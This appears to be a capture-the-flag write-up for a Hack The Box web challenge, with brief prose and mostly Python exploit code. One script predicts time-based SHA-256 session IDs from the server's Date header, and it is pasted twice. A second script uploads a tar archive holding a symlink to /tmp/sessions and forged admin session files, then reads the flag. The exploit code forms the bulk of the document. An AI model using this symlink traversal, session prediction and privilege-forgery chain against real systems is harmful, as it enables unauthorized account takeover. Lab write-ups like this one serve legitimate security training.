
![](https://cdn-images-1.medium.com/max/1000/1*34w6W4N6CWqpvleAjC8Gbg.png)

#### Challenge Scenario

---

As survivors face the vault, anticipation thickens the air, igniting desires for power and glory. Subtle glances reveal hidden ambitions. Unbeknownst to them, toxic gas twists thoughts, fueling greed and paranoia.

check the flag

![](https://cdn-images-1.medium.com/max/1000/1*F2Sf_DUyVJSUes1eVW5ZvA.png)

![](https://cdn-images-1.medium.com/max/1000/1*4ZTPLSfSDQj6UygubCVJog.png)

its a upload page,but cant upload normal type

![](https://cdn-images-1.medium.com/max/1000/1*u8sY6YgTg2lroAbMxvLIQA.png)

check the zip file

we can found UploadEnigma 

it has Zip Slip

![](https://cdn-images-1.medium.com/max/1000/1*ij_tCyPbvN2MPIomVJxsQw.png)

![](https://cdn-images-1.medium.com/max/1000/1*tUtKyY-GFu7m0kwzklYmrA.png)

besides,the SessionMiddleware and GetSession

we can found sessionid

was set by username at /tmp/sessions

![](https://cdn-images-1.medium.com/max/1000/1*LmPa9FkPk2tWZ_ywznCQ5Q.png)

![](https://cdn-images-1.medium.com/max/1000/1*Tulm-cTbISB97MnC2xEPwQ.png)

so， we have a idea

first we need to use resgister to create a new account

f12,get our session, a part our our path

/tmp/session/YOUR ID

![](https://cdn-images-1.medium.com/max/1000/1*mNruGn2MSWHmKSEp6G0w8A.png)

so，make a json like

> **{  
>  “username”: “你的用户名”,  
>  “id”: 你的ID,  
>  “role”: “admin”**

here is one more question

how to handle **“sessionID”**

![](https://cdn-images-1.medium.com/max/1000/1*ZbdFvjRFumntjwLPLJAKiw.png)

we know sessionid only depends on time

so,use

> **_import requests as re_**

> **_import hashlib_**

> **_from datetime import datetime, timezone, timedelta_**

> **_import sys_**

> **_BASE_URL = “http://154.57.164.83:31345"_**

> **_USERNAME = “noexist”_**

> **_MONTHS = [ “Jan” , “Feb” , “Mar” , “Apr” , “May” , “Jun” , “Jul” , “Aug” , “Sep” , “Oct” , “Nov” , “Dec” ]_**

> **_def extract_posix_time_from_fake_login():_**

> **_try:_**

> **_resp = re.post(f”{BASE_URL}/login”, {“username”: USERNAME, “password”: “dummypassword”})_**

> **_date_header = resp.headers.get(“Date”)_**

> **_print(f”日期头：{date_header}”)_**

> **_if not date_header:_**

> **_print(“未找到日期头！”)_**

> **_return None_**

> **_parts = date_header.split(“,”)[1].split()_**

> **_day, mon, year, time_str, tz_str = parts_**

> **_hours, minutes, seconds = time_str.split(“:”)_**

> **_mon_idx = MONTHS.index(mon.capitalize()) + 1_**

> **_tz = timezone(offset=timedelta(hours=0))_**

> **_dt = datetime(int(year), mon_idx, int(day), int(hours), int(minutes), int(seconds), tzinfo=tz)_**

> **_posix = int(dt.timestamp())_**

> **_print(f”日期时间对象：{dt}”)_**

> **_print(f”POSIX时间：{posix}”)_**

> **_return posix_**

> **_except Exception as e:_**

> **_print(f”错误：{e}”)_**

> **_return None_**

> **_if __name__ == “__main__”:_**

> **_if len(sys.argv) > 1:_**

> **_BASE_URL = sys.argv[1]_**

> **_print(f”[*] Target: {BASE_URL}”)_**

> **_posix = extract_posix_time_from_fake_login()_**

> **_if posix:_**

> **_print()_**

> **_h1 = hashlib.sha256(str(posix — 1).encode()).hexdigest()_**

> **_h2 = hashlib.sha256(str(posix).encode()).hexdigest()_**

> **_h3 = hashlib.sha256(str(posix + 1).encode()).hexdigest()_**

> **_print(f”SESSION_ID_1 = \”{h1}\””)_**

> **_print(f”SESSION_ID_2 = \”{h2}\””)_**

> **_print(f”SESSION_ID_3 = \”{h3}\””)_**

![](https://cdn-images-1.medium.com/max/1000/1*eD26ue0vPEpFlqyqnTHgbg.png)

than use

> **_import requests as re_**

> **_import hashlib_**

> **_from datetime import datetime, timezone, timedelta_**

> **_import sys_**

> **_BASE_URL = “http://154.57.164.83:31345"_**

> **_USERNAME = “noexist”_**

> **_MONTHS = [ “Jan” , “Feb” , “Mar” , “Apr” , “May” , “Jun” , “Jul” , “Aug” , “Sep” , “Oct” , “Nov” , “Dec” ]_**

> **_def extract_posix_time_from_fake_login():_**

> **_try:_**

> **_resp = re.post(f”{BASE_URL}/login”, {“username”: USERNAME, “password”: “dummypassword”})_**

> **_date_header = resp.headers.get(“Date”)_**

> **_print(f”日期头：{date_header}”)_**

> **_if not date_header:_**

> **_print(“未找到日期头！”)_**

> **_return None_**

> **_parts = date_header.split(“,”)[1].split()_**

> **_day, mon, year, time_str, tz_str = parts_**

> **_hours, minutes, seconds = time_str.split(“:”)_**

> **_mon_idx = MONTHS.index(mon.capitalize()) + 1_**

> **_tz = timezone(offset=timedelta(hours=0))_**

> **_dt = datetime(int(year), mon_idx, int(day), int(hours), int(minutes), int(seconds), tzinfo=tz)_**

> **_posix = int(dt.timestamp())_**

> **_print(f”日期时间对象：{dt}”)_**

> **_print(f”POSIX时间：{posix}”)_**

> **_return posix_**

> **_except Exception as e:_**

> **_print(f”错误：{e}”)_**

> **_return None_**

> **_if __name__ == “__main__”:_**

> **_if len(sys.argv) > 1:_**

> **_BASE_URL = sys.argv[1]_**

> **_print(f”[*] Target: {BASE_URL}”)_**

> **_posix = extract_posix_time_from_fake_login()_**

> **_if posix:_**

> **_print()_**

> **_h1 = hashlib.sha256(str(posix — 1).encode()).hexdigest()_**

> **_h2 = hashlib.sha256(str(posix).encode()).hexdigest()_**

> **_h3 = hashlib.sha256(str(posix + 1).encode()).hexdigest()_**

> **_print(f”SESSION_ID_1 = \”{h1}\””)_**

> **_print(f”SESSION_ID_2 = \”{h2}\””)_**

> **_print(f”SESSION_ID_3 = \”{h3}\””)_**

![](https://cdn-images-1.medium.com/max/1000/1*eD26ue0vPEpFlqyqnTHgbg.png)

than use

> **_import requests  
> import tarfile  
> import io  
> import json  
> import time  
> BASE_URL = “http://154.57.164.83:31345"  
> TARGET_SIDS = [  
>  “80d1c0c0eeaa4e71ef7b66b73c1db3e3a4905834b02c4bdda4df3094b2bf56d3”,   
>  “8cb4a6f78e32170f0b3a44187d18043c3744f193d9abfe9d165a640c65be9bed”,   
>  “0e285068454463b17656d7e7d3629f7cf39038380c8edff7458e59a3c5e95a12”   
>   
> TARGET_USER = “noexist”   
> HELPER_USER = “pwn_helper_99”_** 

> **_def create_precise_tar():  
>  file_out = io.BytesIO()  
>  with tarfile.open(fileobj=file_out, mode=”w”) as tar:  
>  sym_link = “link_to_tmp”  
>  sym_info = tarfile.TarInfo(name=sym_link)  
>  sym_info.type = tarfile.SYMTYPE  
>  sym_info.linkname = “/tmp/sessions”  
>  tar.addfile(sym_info)_**

>  **_admin_data = json.dumps({  
>  “username”: TARGET_USER,  
>  “id”: 1337,  
>  “role”: “admin”,  
>  “Role”: “admin”,  
>  “Admin”: True  
>  }).encode()  
>  for sid in TARGET_SIDS:  
>  path = f”{sym_link}/{TARGET_USER}/{sid}”  
>  info = tarfile.TarInfo(name=path)  
>  info.size = len(admin_data)  
>  tar.addfile(info, io.BytesIO(admin_data))  
>    
>  return file_out.getvalue()_**

> **_def exploit():  
>  s = requests.Session()  
>    
>  print(f”[*] 正在准备上传助手: {HELPER_USER}”)  
>  s.post(f”{BASE_URL}/register”, json={“username”: HELPER_USER, “password”: “p”})  
>  s.post(f”{BASE_URL}/login”, data={“username”: HELPER_USER, “password”: “p”})_**

>  **_print(“[*] 正在构造并上传精准 Payload…”)  
>  tar_data = create_precise_tar()  
>  files = {‘archive’: (f’exploit_{int(time.time())}.tar’, tar_data)}  
>  r = s.post(f”{BASE_URL}/user/upload”, files=files)  
>  print(f”[*] 上传返回状态码: {r.status_code}”)  
>  print(“[*] 等待解压落盘…”)  
>  time.sleep(2)_**

>  **_print(f”[*] 正在尝试以 {TARGET_USER} 身份验证…”)  
>  for sid in TARGET_SIDS:  
>  cookies = {  
>  “username”: TARGET_USER,  
>  “session”: sid  
>  }  
>  resp = requests.get(f”{BASE_URL}/user/admin”, cookies=cookies, allow_redirects=False)  
>    
>  if “HTB{“ in resp.text:  
>  print(“\n” + “★” * 60)  
>  print(“[🎊] 成功！Flag 如下：”)  
>  import re  
>  flag = re.findall(r’HTB\{.*?\}’, resp.text)  
>  print(flag[0] if flag else resp.text.strip())  
>  print(“★” * 60)  
>  return  
>    
>  print(“[-] 依旧未命中。”)  
> if __name__ == “__main__”:  
> exploit()_**

we got it
![f8MSbltxa0RUzhrQM9x_4A.png](https://cdn-images-1.medium.com/max/1000/1*f8MSbltxa0RUzhrQM9x_4A.png)
**_HTB{S0m3tIm3sIts_J4usT_A_B!G_M3ss}_**